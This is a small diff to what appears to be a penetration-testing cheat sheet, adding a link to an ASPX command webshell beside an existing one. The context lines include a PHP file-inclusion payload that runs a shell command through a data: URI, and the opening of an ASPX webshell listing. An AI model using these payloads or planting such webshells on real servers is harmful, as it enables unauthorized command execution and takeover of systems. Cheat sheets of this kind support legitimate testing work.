@@ -17,6 +17,7 @@ http://<IP>/menu.php?file=data:text/plain,<?php echo shell_exec("whoami")?>
 ### Good ASPX Webshell
 
 [GitHub Link](https://github.com/xl7dev/WebShell/blob/master/Aspx/ASPX%20Shell.aspx)
+or this one [GitHub Link](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx)
 
 ```
 <%-- ASPX Shell by LT <lt@mac.hush.com> (2007) --%>
